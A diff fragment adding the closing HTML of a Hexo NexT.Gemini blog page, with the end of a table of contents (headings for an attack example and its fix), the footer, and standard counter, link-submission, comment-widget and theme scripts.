class="nav-link" href="#3-5-1-攻击示例"><span class="nav-number">3.4.1.</span> <span class="nav-text">3.5.1. 攻击示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-2-解决方法"><span class="nav-number">3.4.2.</span> <span class="nav-text">3.5.2. 解决方法</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2013 &mdash; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">色魔科技</span>
+
+  
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytjBrzIY';
+      var conf = 'e3ae49b68dbe1a48b4fee1de4e87cc06';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
